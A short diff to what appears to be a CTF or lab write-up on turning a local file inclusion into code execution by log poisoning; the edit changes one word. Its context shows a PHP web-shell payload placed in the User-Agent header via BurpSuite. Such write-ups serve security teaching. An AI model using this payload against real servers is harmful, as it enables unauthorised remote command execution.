@@ -87,7 +87,7 @@ Now, given the LFI vulnerability, if we can successfully access the log, we can 
 
 
 Now it's time to fire up BurpSuite.
-We'll put the php shell in the User-Agent string:
+We'll put the php web shell in the User-Agent string:
 `<?php echo system($_GET['cmd']); ?>`
 ![](https://github.com/user-attachments/assets/2cf45042-de12-4575-aba6-f3416c552bbc)
 
